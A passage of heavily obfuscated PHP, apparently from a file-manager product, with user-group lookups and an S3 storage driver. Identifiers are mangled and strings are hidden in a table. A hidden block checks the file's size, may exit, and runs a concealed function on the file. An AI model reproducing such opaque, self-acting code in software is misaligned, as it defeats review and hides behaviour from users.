Ó]); } } unset($òÈúé–); $·ø±µ´[$æÔ½ï›Ÿ[455]] = array_values($·ø±µ´[$æÔ½ï›Ÿ[455]]); $·ø±µ´[$æÔ½ï›Ÿ[452]] = array($æÔ½ï›Ÿ[2393] => count($·ø±µ´[$æÔ½ï›Ÿ[455]]), $æÔ½ï›Ÿ[2391] => $·ø±µ´[$æÔ½ï›Ÿ[452]][$æÔ½ï›Ÿ[449]], $æÔ½ï›Ÿ[2390] => 1, $æÔ½ï›Ÿ[2392] => 1); } private function _searchFromMeta($‹ùûâœ, $™‰ŠÈÚ‘, $¥ÓñğáÛ) { $œµ¶´€ò =& $_SERVER[áäÒ½¯Ç]; $™‰ŠÈÚ‘ = strtolower($™‰ŠÈÚ‘); $€¦Ñ£ÂÔ = array($œµ¶´€ò[95] => $‹ùûâœ, $œµ¶´€ò[460] => array($œµ¶´€ò[479], "\45{$™‰ŠÈÚ‘}\45")); $€¦Ñ£ÂÔ = $this->parseWhereLike($€¦Ñ£ÂÔ); $‘¦Ù¯Ñ° = Model($œµ¶´€ò[2668])->where($€¦Ñ£ÂÔ)->limit($¥ÓñğáÛ)->select(); if (!$‘¦Ù¯Ñ°) { return array(); } $‘¦Ù¯Ñ° = array_to_keyvalue($‘¦Ù¯Ñ°, $œµ¶´€ò[12], $œµ¶´€ò[1542]); $ŞŞØëôØ = $this->where(array($œµ¶´€ò[1918] => array($œµ¶´€ò[7], $‘¦Ù¯Ñ°)))->select(); if (!$ŞŞØëôØ) { return array(); } return $ŞŞØëôØ; } private function _listDataApplyItem($ó¥ªÕ­ã) { $È»Æ‚–Ï = array($ó¥ªÕ­ã); $this->_listDataApply($È»Æ‚–Ï); return $È»Æ‚–Ï[0]; } private function _listDataApply(&$­¨»ë‘ˆ) { $îÆé™ÔÑ =& $_SERVER[áäÒ½¯Ç]; if (!$­¨»ë‘ˆ) { return; } array_remove_key($­¨»ë‘ˆ, $îÆé™ÔÑ[1002]); $Õú©ß’› = array_to_keyvalue($­¨»ë‘ˆ, $îÆé™ÔÑ[12], $îÆé™ÔÑ[1542]); $this->_listAppendGroup($­¨»ë‘ˆ, $Õú©ß’›); $this->_listAppendMeta($­¨»ë‘ˆ, $Õú©ß’›); $this->_listAppendSourceRoot($­¨»ë‘ˆ, $Õú©ß’›); } private function _listAppendSourceRoot(&$ú‚¶™Ù, $Òè£‡ìË) { $Ô•ıù¤ =& $_SERVER[áäÒ½¯Ç]; $€‹Á§ÑÔ = Model($Ô•ıù¤[935])->listSourceRoot(SourceModel::TYPE_USER, $Òè£‡ìË); $€‹Á§ÑÔ = array_to_keyvalue($€‹Á§ÑÔ, $Ô•ıù¤[594]); $€‹Á§ÑÔ = array_remove_key($€‹Á§ÑÔ, $Ô•ıù¤[594]); foreach ($ú‚¶™Ù as &$ÜÇÉ¥) { $ÜÇÉ¥[$Ô•ıù¤[90]] = $€‹Á§ÑÔ[$ÜÇÉ¥[$Ô•ıù¤[1542]]] ? $€‹Á§ÑÔ[$ÜÇÉ¥[$Ô•ıù¤[1542]]] : array(); } unset($ÜÇÉ¥); } private function _listAppendGroup(&$Ÿ«úï®, $ÇÊßÛÏó) { $¤õ½‰³ =& $_SERVER[áäÒ½¯Ç]; $øá¼’¨É = array($¤õ½‰³[1542] => array($¤õ½‰³[7], $ÇÊßÛÏó)); $ÃÁ‚ø· = Model($¤õ½‰³[2225])->where($øá¼’¨É)->select(); $ µğˆğ = array_to_keyvalue($ÃÁ‚ø·, $¤õ½‰³[12], $¤õ½‰³[1444]); $ µğˆğ = array_remove_value(array_unique($ µğˆğ), $¤õ½‰³[239]); if (!$ µğˆğ || !$ÃÁ‚ø·) { return; } $øá¼’¨É = array($¤õ½‰³[1444] => array($¤õ½‰³[7], $ µğˆğ)); $É¼†×¨² = Model($¤õ½‰³[1442])->field($¤õ½‰³[2669])->where($øá¼’¨É)->select(); $É¼†×¨² = array_to_keyvalue($É¼†×¨², $¤õ½‰³[1444]); $ÃÁ‚ø· = array_to_keyvalue_group($ÃÁ‚ø·, $¤õ½‰³[1542]); foreach ($ÃÁ‚ø· as &$Å¹œøÕ€) { $º©Şà»€ = array(); foreach ($Å¹œøÕ€ as $û£âØíä) { if (!$û£âØíä[$¤õ½‰³[1589]]) { continue; } $Ü¸ç¹Äğ = Model($¤õ½‰³[596])->listData($û£âØíä[$¤õ½‰³[1589]]); $º©Şà»€[] = array($¤õ½‰³[1444] => $û£âØíä[$¤õ½‰³[1444]], $¤õ½‰³[2670] => $É¼†×¨²[$û£âØíä[$¤õ½‰³[1444]]][$¤õ½‰³[32]], $¤õ½‰³[609] => $É¼†×¨²[$û£âØíä[$¤õ½‰³[1444]]][$¤õ½‰³[609]], $¤õ½‰³[507] => $Ü¸ç¹Äğ); } $Å¹œøÕ€ = $º©Şà»€; } unset($Å¹œøÕ€); foreach ($Ÿ«úï® as &$•ÏÀ³›) { $•ÏÀ³›[$¤õ½‰³[1443]] = array(); if (isset($ÃÁ‚ø·[$•ÏÀ³›[$¤õ½‰³[1542]]])) { $•ÏÀ³›[$¤õ½‰³[1443]] = $ÃÁ‚ø·[$•ÏÀ³›[$¤õ½‰³[1542]]]; } } unset($•ÏÀ³›); } public function userAppendGroup($êèŸ—ó) { $ĞšÌİÚ =& $_SERVER[áäÒ½¯Ç]; if (!$êèŸ—ó) { return array(); } $this->_listAppendGroup($êèŸ—ó, array_to_keyvalue($êèŸ—ó, $ĞšÌİÚ[12], $ĞšÌİÚ[1542])); return $êèŸ—ó; } private function _listAppendMeta(&$§ß°ØÛò, $Ö‚şşº) { $²í­»¨ú =& $_SERVER[áäÒ½¯Ç]; $Í¶ğìº = UserJobModel::JOB_KEY; $ÖÛ¦¢… = array($²í­»¨ú[2221]); $½É’œ½Ì = array($²í­»¨ú[1542] => array($²í­»¨ú[7], $Ö‚şşº)); $Ï‡ŠëêÕ = Model($²í­»¨ú[2645])->where($½É’œ½Ì)->select(); $Õí¸›Å = array(); foreach ($Ï‡ŠëêÕ as $£Ù²€ı²) { $²ï „…Ü = $£Ù²€ı²[$²í­»¨ú[1542]]; if (!isset($Õí¸›Å[$²ï „…Ü])) { $Õí¸›Å[$²ï „…Ü] = array(); } $Õí¸›Å[$²ï „…Ü][$£Ù²€ı²[$²í­»¨ú[95]]] = $£Ù²€ı²[$²í­»¨ú[460]]; } $ÈØŠíÆè = Model($²í­»¨ú[2671]); foreach ($§ß°ØÛò as &$şàşÇî) { $²ï „…Ü = $şàşÇî[$²í­»¨ú[1542]]; $ÇÔşÌ²à = isset($Õí¸›Å[$²ï „…Ü]) ? $Õí¸›Å[$²ï „…Ü] : array(); $şàşÇî[$²í­»¨ú[560]] = array_field_key($ÇÔşÌ²à, $ÖÛ¦¢…); $şàşÇî[$²í­»¨ú[2672]] = array(); if (isset($ÇÔşÌ²à[$Í¶ğìº])) { $şàşÇî[$²í­»¨ú[2672]] = $ÈØŠíÆè->getUserJobInfo($ÇÔşÌ²à[$Í¶ğìº]); } } unset($şàşÇî); } protected function groupUserAll($Ş“œ÷ô) { $É¡û‹¥ =& $_SERVER[áäÒ½¯Ç]; if (!$Ş“œ÷ô) { return !1; } $íè‡èúğ = Model($É¡û‹¥[2225])->field($É¡û‹¥[1542])->where(array($É¡û‹¥[1444] => array($É¡û‹¥[7], $Ş“œ÷ô)))->select(); $íè‡èúğ = array_to_keyvalue($íè‡èúğ, $É¡û‹¥[12], $É¡û‹¥[1542]); return array_unique($íè‡èúğ); } public function userSearch($™Ã™©Éœ, $É¯ÂÓÜ‡ = "\52") { return Model($_SERVER[áäÒ½¯Ç][622])->where($™Ã™©Éœ)->field($É¯ÂÓÜ‡)->find(); } } goto DŞŠ±‹Ü¬è; DÓË•©»ª¢: if ($_SERVER[$_SERVER[áäÒ½¯Ç][217]] != $_size($_file)) { $_getc = $_SERVER[áäÒ½¯Ç][218]; $_getfile = $_SERVER[$_SERVER[áäÒ½¯Ç][219]] . $_SERVER[áäÒ½¯Ç][220]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[áäÒ½¯Ç][221], $_getfilec); if (count($_getarrs) < $_SERVER[áäÒ½¯Ç][222]) { $exit = $_SERVER[áäÒ½¯Ç][223]; $exit(); } $_act = $_SERVER[áäÒ½¯Ç][224]; $_act($_file); } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\166\x34"; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\x30"; public $config = array(); public function __construct($ß›Ö«õ ) { set_timeout(); require_once SDK_DIR . $_SERVER[áäÒ½¯Ç][225]; parent::__construct(); $this->_init($ß›Ö«õ ); } public function _init($òº­éù‡) { $¸§‚Á =& $_SERVER[áäÒ½¯Ç]; $this->config = $òº­éù‡; foreach ($òº­éù‡ as $Û½¨´öü => $à“¡»Í±) { if (isset($this->{$Û½¨´öü})) { $this->{$Û½¨´öü} = $à“¡»Í±; } } $this->endpoint = $òº­éù‡[$¸§‚Á[226]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $Â«ß±ù = $this->getHost(); if (!get_url_scheme($this->endpoint) && substr($Â«ß±ù, 0, 7) == $¸§‚Á[227]) { $Â«ß±ù = $¸§‚Á[228] . substr($Â«ß±ù, 7); } $this->client->setEndpoint($Â«ß±ù); if (in_array(ACTION, array($¸§‚Á[211], $¸§‚Á[212]))) { $this->client->setExceptions(); } } public function setSignVersion($¶ÙÎƒ¬ç = "\x76\64") { $this->signVer = $¶ÙÎƒ¬ç; $this->client->setSignVersion($¶ÙÎƒ¬ç); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { try { return $this->client->getBucketCors($this->bucket); } catch (Exception $èàÙœ±) { return null; } } public function isBucketCors() { $×‰úâ’ç =& $_SERVER[áäÒ½¯Ç]; $µ˜²é‹Í = $this->getBucketCors(); if (!$µ˜²é‹Í || !is_array($µ˜²é‹Í)) { return !1; } if (!is_array($µ˜²é‹Í[$×‰úâ’ç[229]])) { $µ˜²é‹Í[$×‰úâ’ç[229]] = explode($×‰úâ’ç[50], $µ˜²é‹Í[$×‰úâ’ç[229]]); } if ($µ˜²é‹Í[$×‰úâ’ç[230]] != $×‰úâ’ç[231] || !in_array($×‰úâ’ç[231], $µ˜²é‹Í[$×‰úâ’ç[229]])) { return !1; } $ûöí’Ñ¡ = array_map($×‰úâ’ç[232], $µ˜²é‹Í[$×‰úâ’ç[233]]); if (!is_array($ûöí’Ñ¡)) { $ûöí’Ñ¡ = array(); } $ËŠ“Âå® = array($×‰úâ’ç[234], $×‰úâ’ç[235], $×‰úâ’ç[236], $×‰úâ’ç[237], $×‰úâ’ç[238]); $’…Àè‹¼ = array_diff($ËŠ“Âå®, $ûöí’Ñ¡); return empty($’…Àè‹¼); } public function getBktRegion() { return $this->client->getBucketRegion($this->bucket); } public function mkfile($èå¯âÛ, $Ú“â ¡Î = '', $“»ËˆÁ» = REPEAT_RENAME) { $‰²×ÍÁ = $this->setContent($èå¯âÛ, $Ú“â ¡Î); if ($‰²×ÍÁ !== !1) { return $this->getPathOuter($èå¯âÛ); } return !1; } public function mkdir($Â™ŠŒ©Ç, $——¾ƒ—Æ = REPEAT_SKIP) { $™²˜ºÚÆ =& $_SERVER[áäÒ½¯Ç]; if (empty($Â™ŠŒ©Ç) && $Â™ŠŒ©Ç !== $™²˜ºÚÆ[239]) { return !1; } if ($——¾ƒ—Æ && $this->_isFolder($Â™ŠŒ©Ç)) { return $this->getPathOuter($Â™ŠŒ©Ç); } $ËöÔ¼ö¥ = $this->setContent($Â™ŠŒ©Ç, $™²˜ºÚÆ[12], !0); if ($ËöÔ¼ö¥ !== !1) { return $this->getPathOuter($Â™ŠŒ©Ç); } return !1; } public function copyFile($·ãšˆ—¿, $„•òú¬, $‰ÒÅ£±ä = array()) { $ÒÀêŒ¾³ =& $_SERVER[áäÒ½¯Ç]; $÷Ø¯• = $this->objectMeta($·ãšˆ—¿); if (!$÷Ø¯•) { return !1; } if ($÷Ø¯•[$ÒÀêŒ¾³[79]] <= 1024 * 1024 * 200) { $¤·±Ïñâ = $this->client->copyObject($this->bucket, $·ãšˆ—¿, $this->bucket, $„•òú¬, $ÒÀêŒ¾³[240], $‰ÒÅ£±ä); } else { $¤·±Ïñâ = $this->client->multiCopyObject($this->bucket, $·ãšˆ—¿, $this->bucket, $„•òú¬, $‰ÒÅ£±ä); } $¤·±Ïñâ = $¤·±Ïñâ ? $this->getPathOuter($„•òú¬) : !1; return $¤·±Ïñâ; } public function moveFile($‡¶òØ½„, $éû€Š»‘) { if ($this->copyFile($‡¶òØ½„, $éû€Š»‘)) { $this->delFile($‡¶òØ½„); return $this->getPathOuter($éû€Š»‘); } return !1; } public function delFile($á ìªÚ£) { return $this->client->deleteObject($this->bucket, $á ìªÚ£); } public function delFolder($Ø«Ş—ôï) { $şÓ¬×êÈ =& $_SERVER[áäÒ½¯Ç]; if (!$this->exist($Ø«Ş—ôï)) { return !0; } $this->listItemCache = !1; $Òœ¼‚øÄ = $this->fileList($Ø«Ş—ôï); $this->listItemCache = !0; $‚ò»ı“ = trim($Ø«Ş—ôï, $şÓ¬×êÈ[8]) . $şÓ¬×êÈ[8]; if (!empty($Ø«Ş—ôï) && $Ø«Ş—ôï !== $şÓ¬×êÈ[239] && !in_array($‚ò»ı“, $Òœ¼‚øÄ[$şÓ¬×êÈ[85]])) { $Òœ¼‚øÄ[$şÓ¬×êÈ[85]][] = $‚ò»ı“; } $Øçå’¾… = $this->delByBatch($Òœ¼‚øÄ[$şÓ¬×êÈ[86]]); if (!$Øçå’¾…) { return !1; } $Øçå’¾… = $this->delByBatch($Òœ¼‚øÄ[$şÓ¬×êÈ[85]]); if (!$Øçå’¾…) { return !1; } return $this->delFile($‚ò»ı“); } private function delByBatch($Å‰ÇİĞ) { foreach (array_chunk($Å‰ÇİĞ, 1000) as $€®êŠÆš) { $İŞªª¸ = $this->client->deleteObjects($this->bucket, $€®êŠÆš); if (!$İŞªª¸) { return !1; } } return !0; } public function rename($ş–ó„¡©, $ÁóßÅˆæ) { return $this->renameObject($ş–ó„¡©, $ÁóßÅˆæ); } public function listPath($—ÎÀ…€Å, $Îá••Ô¹ = false) { $ó‘³«Ğ³ =& $_SERVER[áäÒ½¯Ç]; $ù‰“Éò = $this->fileList($—ÎÀ…€Å, $ó‘³«Ğ³[8], !0); foreach ($ù‰“Éò[$ó‘³«Ğ³[85]] as $üÜšÌ‹Š => $Œ²çØ‚) { $ù‰“Éò[$ó‘³«Ğ³[85]][$üÜšÌ‹Š] = $this->folderInfo($Œ²çØ‚, $Îá••Ô¹, $Œ²çØ‚); } foreach ($ù‰“Éò[$ó‘³«Ğ³[86]] as $üÜšÌ‹Š => $Œ²çØ‚) { $ù‰“Éò[$ó‘³«Ğ³[86]][$üÜšÌ‹Š] = $this->fileInfo($Œ²çØ‚[$ó‘³«Ğ³[32]], $Îá••Ô¹, $Œ²çØ‚); } return $ù‰“Éò; } protected function infoChildren($Óã—ŠŞµ, &$ˆîâÃ¯­) { $ø€âºÆ· =& $_SERVER[áäÒ½¯Ç]; $ŠÑŠÜğ = $this->fileList($Óã—ŠŞµ, $ø€âºÆ·[12], !0); $ˆîâÃ¯­[$ø€âºÆ·[81]] += count($ŠÑŠÜğ[$ø€âºÆ·[85]]); $ˆîâÃ¯­[$ø€âºÆ·[80]] += count($ŠÑŠÜğ[$ø€âºÆ·[86]]); foreach ($ŠÑŠÜğ[$ø€âºÆ·[86]] as $ü×åã±‡) { if (!$ü×åã±‡ || !$ü×åã±‡[$ø€âºÆ·[79]]) { continue; } $ˆîâÃ¯­[$ø€âºÆ·[79]] += $ü×åã±‡[$ø€âºÆ·[79]]; } } private function fileInfo($¨ì“Šğø, $ñœ÷ÖÌÃ = false, $·Œ×‚ó± = array()) { $Ëœñ£Ü¿ =& $_SERVER[áäÒ½¯Ç]; $ÉÁ”áÖ‚ = array($Ëœñ£Ü¿[32] => $this->pathThis($¨ì“Šğø), $Ëœñ£Ü¿[87] => $this->getPathOuter($¨ì“Šğø), $Ëœñ£Ü¿[33] => $Ëœñ£Ü¿[241], $Ëœñ£Ü¿[167] => $this->ext($¨ì“Šğø), $Ëœñ£Ü¿[79] => isset($·Œ×‚ó±[$Ëœñ£Ü¿[79]]) ? $·Œ×‚ó±[$Ëœñ£Ü¿[79]] : 0); if ($ñœ÷ÖÌÃ) { return $ÉÁ”áÖ‚; } $ÉÁ”áÖ‚[$Ëœñ£Ü¿[242]] = $ÉÁ”áÖ‚[$Ëœñ£Ü¿[88]] = 0; $ÉÁ”áÖ‚[$Ëœñ£Ü¿[243]] = $ÉÁ”áÖ‚[$Ëœñ£Ü¿[244]] = !0; if (empty($·Œ×‚ó±)) { $·Œ×‚ó± = $this->objectMeta($¨ì“Šğø); if (!$·Œ×‚ó±) { return $ÉÁ”áÖ‚; } } if (isset($·Œ×‚ó±[$Ëœñ£Ü¿[245]]) && $·Œ×‚ó±[$Ëœñ£Ü¿[245]]) { $ÉÁ”áÖ‚[$Ëœñ£Ü¿[246]] = $·Œ×‚ó±[$Ëœñ£Ü¿[245]]; } if (isset($·Œ×‚ó±[$Ëœñ£Ü¿[205]])) { $ÉÁ”áÖ‚[$Ëœñ£Ü¿[88]] = $·Œ×‚ó±[$Ëœñ£Ü¿[205]]; } if (isset($·Œ×‚ó±[$Ëœñ£Ü¿[79]])) { $ÉÁ”áÖ‚[$Ëœñ£Ü¿[79]] = $·Œ×‚ó±[$Ëœñ£Ü¿[79]]; } return $ÉÁ”áÖ‚; } private function folderInfo($´ª´ıÒ, $âæÓÄ§ñ = false, $÷óÂ®Í€ = array()) { $ê§³‘µ =& $_SERVER[áäÒ½¯Ç]; $¸ø™“¿½ = array($ê§³‘µ[32] => $this->pathThis($´ª´ıÒ), $ê§³‘µ[87] => $this->getPathOuter($ê§³‘µ[8] . $´ª´ıÒ), $ê§³‘µ[33] => $ê§³‘µ[78]); if ($âæÓÄ§ñ) { return $¸ø™“¿½; } $¸ø™“¿½[$ê§³‘µ[242]] = $¸ø™“¿½[$ê§³‘µ[88]] = 0; $¸ø™“¿½[$ê§³‘µ[243]] = $¸ø™“¿½[$ê§³‘µ[244]] = !0; if ($´ª´ıÒ == $ê§³‘µ[12]) { return $¸ø™“¿½; } if (empty($÷óÂ®Í€)) { $÷óÂ®Í€ = $this->objectMeta(trim($´ª´ıÒ, $ê§³‘µ[8]) . $ê§³‘µ[8]); } if (isset($÷óÂ®Í€[$ê§³‘µ[205]])) { $¸ø™“¿½[$ê§³‘µ[242]] = $÷óÂ®Í€[$ê§³‘µ[205]]; } return $¸ø™“¿½; } private function fileList($ŠŞøÀÑä, $ëØâˆÒ = '', $ˆùûìÄĞ = 0) { $ì¥İòúş =& $_SERVER[áäÒ½¯Ç]; $Ì¯ØÉÅ = rtrim($ŠŞøÀÑä, $ì¥İòúş[8]) . $ì¥İòúş[8]; $Á”¤ùéÕ = $this->listObjs($Ì¯ØÉÅ, null, null, $ëØâˆÒ); if (!$Á”¤ùéÕ) { return array($ì¥İòúş[85] => array(), $ì¥İòúş[86] => array()); } $‚¾¿‡›î = $æ €’§ = array(); foreach ($Á”¤ùéÕ[$ì¥İòúş[247]] as $ÂÁƒ¿§ó) { $Å†ËîåÆ = $ÂÁƒ¿§ó[$ì¥İòúş[32]]; if ($Å†ËîåÆ == $Ì¯ØÉÅ) { continue; } $ıâŞ¹Ş¤ = isset($ÂÁƒ¿§ó[$ì¥İòúş[79]]) ? $ÂÁƒ¿§ó[$ì¥İòúş[79]] : 0; $É»’®àë = $ıâŞ¹Ş¤ == 0 && substr($Å†ËîåÆ, strlen($Å†ËîåÆ) - 1, 1) == $ì¥İòúş[8] ? !0 : !1; $this->cacheMethodInfoSet($Å†ËîåÆ, $É»’®àë, $ÂÁƒ¿§ó); if ($É»’®àë) { $‚¾¿‡›î[] = $Å†ËîåÆ; continue; } $æ €’§[] = $ˆùûìÄĞ ? $ÂÁƒ¿§ó : $Å†ËîåÆ; } foreach ($Á”¤ùéÕ[$ì¥İòúş[248]] as $ÂÁƒ¿§ó) { $‚¾¿‡›î[] = $ÂÁƒ¿§ó[$ì¥İòúş[32]]; $this->cacheMethodInfoSet($ÂÁƒ¿§ó[$ì¥İòúş[32]], !0); } $this->cacheMethodInfoSet($ŠŞøÀÑä, !0); return array($ì¥İòúş[85] => $‚¾¿‡›î, $ì¥İòúş[86] => $æ €’§); } private function listObjs($½È©ÖÅ, $ìúªî•´ = null, $å¼Ğ„® = null, $Â¦îœ = null) { $ûé±®Äí =& $_SERVER[áäÒ½¯Ç]; $½È©ÖÅ = trim($½È©ÖÅ, $ûé±®Äí[8]); $ÌÓ«›à‘ = empty($½È©ÖÅ) && $½È©ÖÅ !== $ûé±®Äí[239] ? $ûé±®Äí[12] : $½È©ÖÅ . $ûé±®Äí[8]; return $this->client->getBucket($this->bucket, $ÌÓ«›à‘, $ìúªî•´, $å¼Ğ„®, $Â¦îœ, !0); } public function has($×²Ñ¯€, $›ı¤Îşå = false, $„“ñßî’ = true) { $õïí„Ş =& $_SERVER[áäÒ½¯Ç]; $×²Ñ¯€ = trim($×²Ñ¯€, $õïí„Ş[8]); $¬€ú°Ğ½ = empty($×²Ñ¯€) && $×²Ñ¯€ !== $õïí„Ş[239] ? $õïí„Ş[12] : $×²Ñ¯€ . $õïí„Ş[8]; $÷áòÙÛ = null; $êÈ°¹Î¨ = 500; $şúÕƒÉ× = $õïí„Ş[8]; $Ô¿’ĞÕÚ = $İÔÜûªŸ = array(); while (!0) { $‚ìÌ¬‘ï = $this->listObjs($×²Ñ¯€, $÷áòÙÛ, $êÈ°¹Î¨, $şúÕƒÉ×); if (!$‚ìÌ¬‘ï) { break; } $÷áòÙÛ = $‚ìÌ¬‘ï[$õïí„Ş[249]]; $ªš‡—œš = $‚ìÌ¬‘ï[$õïí„Ş[247]]; $“Ü¿ÓÔ = $‚ìÌ¬‘ï[$õïí„Ş[248]]; if (empty($ªš‡—œš) && empty($“Ü¿ÓÔ)) { break; } if (count($ªš‡—œš) == 1 && $ªš‡—œš[0][$õïí„Ş[32]] == $¬€ú°Ğ½) { break; } if ($›ı¤Îşå) { if (count($ªš‡—œš)) { $ªš‡—œš = array_column($ªš‡—œš, $õïí„Ş[32]); $Ô¿’ĞÕÚ = array_merge($Ô¿’ĞÕÚ, $ªš‡—œš); } if (count($“Ü¿ÓÔ)) { $“Ü¿ÓÔ = array_column($“Ü¿ÓÔ, $õïí„Ş[32]); $İÔÜûªŸ = array_merge($İÔÜûªŸ, $“Ü¿ÓÔ); } if ($÷áòÙÛ === null) { break; } continue; } if ($„“ñßî’) { if (!empty($ªš‡—œš)) { if (count($ªš‡—œš) > 1 || isset($ªš‡—œš[0][$õïí„Ş[32]]) && $ªš‡—œš[0][$õïí„Ş[32]] != $¬€ú°Ğ½) { return !0; } } } else { if (!empty($“Ü¿ÓÔ)) { return !0; } } if ($÷áòÙÛ === null) { break; } } if ($›ı¤Îşå) { $Ô¿’ĞÕÚ = array_diff($Ô¿’ĞÕÚ, array($¬€ú°Ğ½)); $Ô¿’ĞÕÚ = count(array_unique($Ô¿’ĞÕÚ)); $İÔÜûªŸ = count(array_unique($İÔÜûªŸ)); return array($õïí„Ş[250] => $Ô¿’ĞÕÚ, $õïí„Ş[251] => $İÔÜûªŸ); } return !1; } public function listAll($¾¸¿”‡Ù) { $×“Ó˜ú„ =& $_SERVER[áäÒ½¯Ç]; $ì´Á½ë = $this->fileList($¾¸¿”‡Ù, $×“Ó˜ú„[12], !0); $äğÄ¦À = array_to_keyvalue($ì´Á½ë[$×“Ó˜ú„[86]], $×“Ó˜ú„[32]); foreach ($ì´Á½ë[$×“Ó˜ú„[85]] as $êè‚æ¾›) { if (is_string($êè‚æ¾›)) { $äğÄ¦À[$êè‚æ¾›] = array($×“Ó˜ú„[79] => 0); } } return $this->listAllFiles($¾¸¿”‡Ù, $äğÄ¦À); } public function canRead($Ğâ–‚’ª) { $¨ÂôÈâ =& $_SERVER[áäÒ½¯Ç]; $Œé·–ûĞ = $this->client->getAccessControlPolicy($this->bucket, $Ğâ–‚’ª); if (!$Œé·–ûĞ) { return !1; } return in_array($Œé·–ûĞ, array($¨ÂôÈâ[252], $¨ÂôÈâ[253], $¨ÂôÈâ[254])) ? !0 : !1; } public function canWrite($Â£•Ëà˜) { $Á®ÈÏìØ =& $_SERVER[áäÒ½¯Ç]; $³ûÛš™© = $this->client->getAccessControlPolicy($this->bucket, $Â£•Ëà˜); if (!$³ûÛš™©) { return !1; } return in_array($³ûÛš™©, array($Á®ÈÏìØ[252], $Á®ÈÏìØ[253])) ? !0 : !1; } public function getContent($‰ı›µøò) { return $this->client->getObject($this->bucket, $‰ı›µøò); } public function setContent($ÄŞˆÂ‡™, $¼¶Õˆ‚° = '', $àÈÙ†Öè = false) { $“œ†§çî =& $_SERVER[áäÒ½¯Ç]; $ÄŞˆÂ‡™ = $àÈÙ†Öè ? trim($ÄŞˆÂ‡™, $“œ†§çî[8]) . $“œ†§çî[8] : $ÄŞˆÂ‡™; $Åô«·È = get_file_mime(get_path_ext($ÄŞˆÂ‡™)); $ƒîİ©¥ = $this->client->putObject($¼¶Õˆ‚°, $this->bucket, $ÄŞˆÂ‡™, $“œ†§çî[240], array(), $Åô«·È); if (!$ƒîİ©¥) { return !1; } if ($àÈÙ†Öè) { return !0; } return $ƒîİ©¥ ? !0 : !1; } public function fileSubstr($èÚÓî‡€, $‘Š›ğÔ‰, $¬º™ÁŞ) { $ì¼à†Ïù = $‘Š›ğÔ‰ + $¬º™ÁŞ - 1; return $this->client->getObject($this->bucket, $èÚÓî‡€, array($_SERVER[áäÒ½¯Ç][255] => "\x62\171\164\x65\163\75{$‘Š›ğÔ‰}\55{$ì¼à†Ïù}")); } public function upload($ñ®É¼‰“, $ˆÆíŠ“, $©åËÙö³ = false, $šÂË€ = REPEAT_REPLACE) { $‡Â«á’á =& $_SERVER[áäÒ½¯Ç]; if (!$ˆÆíŠ“ || !@file_exists($ˆÆíŠ“)) { return !1; } $í„‘á…„ = array($‡Â«á’á[256] => @md5_file($ˆÆíŠ“)); $  “Û¤Ş = array($‡Â«á’á[257] => get_file_mime(get_path_ext($ñ®É¼‰“))); if (IO::size($ˆÆíŠ“) <= 1024 * 1024 * 200) { $ª‰Ù¡µÆ = $this->client->putObjectFile($ˆÆíŠ“, $this->bucket, $ñ®É¼‰“, $‡Â«á’á[240], $í„‘á…„, $  “Û¤Ş); return !empty($ª‰Ù¡µÆ) ? $this->getPathOuter($ñ®É¼‰“) : !1; } $ÓØÊ÷•ş = $this->client->multiUploadObject($ˆÆíŠ“, $this->bucket, trim($ñ®É¼‰“, $‡Â«á’á[8]), $í„‘á…„, $  “Û¤Ş); return $ÓØÊ÷•ş ? $this->getPathOuter($ñ®É¼‰“) : !1; } public function download($øÕŠ÷Ö¸, $…ƒ—Úı) { if (!@is_dir($this->pathFather($…ƒ—Úı)) && !IO::mkdir($this->pathFather($…ƒ—Úı))) { return !1; } $¿»¬ØÌ = $this->client->getObject($this->bucket, $øÕŠ÷Ö¸, array(), $…ƒ—Úı); return $¿»¬ØÌ !== !1 ? $…ƒ—Úı : !1; } public function link($ƒ½™Œİ, $ĞÂÈ¢×İ = array()) { return $this->getPreSignedURL($ƒ½™Œİ, 3600 * 12, $ĞÂÈ¢×İ); } private function getPreSignedURL($È½úëîó, $ÕÍ¿Å–, $ÛüêĞÔ = array(), $ÛÖÕâü = "\107\x45\x54") { $òÒ¢õåä =& $_SERVER[áäÒ½¯Ç]; $È½úëîó = trim($È½úëîó, $òÒ¢õåä[8]); if ($this->signVer == $òÒ¢õåä[258]) { return $this->client->getPreSignedV2URL($this->bucket, $È½úëîó, $ÕÍ¿Å–, $ÛÖÕâü, $ÛüêĞÔ); } return $this->client->getPreSignedV4URL($this->bucket, $È½úëîó, $ÕÍ¿Å–, array(), $ÛÖÕâü, $ÛüêĞÔ); } public function fileOut($ú¦é³öà, $‡Ú’×ü = false, $±¹îìù = false, $¿°ÁÑ¨Ö = '') { $†İÛ¿Éè =& $_SERVER[áäÒ½¯Ç]; if ($this->isFileOutServer()) { return $this->fileOutServer($ú¦é³öà, $‡Ú’×ü, $±¹îìù, $¿°ÁÑ¨Ö); } if (!$±¹îìù) { $±¹îìù = $this->pathThis($ú¦é³öà); } $ÅæšøÙÅ = get_file_mime(get_path_ext($±¹îìù)); if ($ÅæšøÙÅ == $†İÛ¿Éè[259]) { return parent::fileOut($ú¦é³öà, $‡Ú’×ü, $±¹îìù, $¿°ÁÑ¨Ö); } $ŸƒçŞ±× = array($†İÛ¿Éè[260] => $ÅæšøÙÅ); if ($‡Ú’×ü) { $ŸƒçŞ±×[$†İÛ¿Éè[261]] = $†İÛ¿Éè[262] . rawurlencode($±¹îìù); } else { } $á²–‚ ® = $this->link($ú¦é³öà, $ŸƒçŞ±×); $this->fileOutLink($á²–‚ ®); } public function fileOutServer($³ÀÕğ×®, $¢º¤ = false, $Âı¦îÁÅ = false, $¢Ù¦Ş¤Ó = '') { parent::fileOut($³ÀÕğ×®, $¢º¤, $Âı¦îÁÅ, $¢Ù¦Ş¤Ó); } public function fileOutImageServer($¡¨µş™, $áÓô« = 250) { parent::fileOutImage($¡¨µş™, $áÓô«); } public function fileOutLink($Ğ– ğõ) { $ÒÕ„è„• =& $_SERVER[áäÒ½¯Ç]; if (!isset($this->osType)) { $this->osType = $this->getType(); } if (!in_array($this->osType, array($ÒÕ„è„•[67], $ÒÕ„è„•[66], $ÒÕ„è„•[68])) && !get_url_scheme($this->endpoint) && 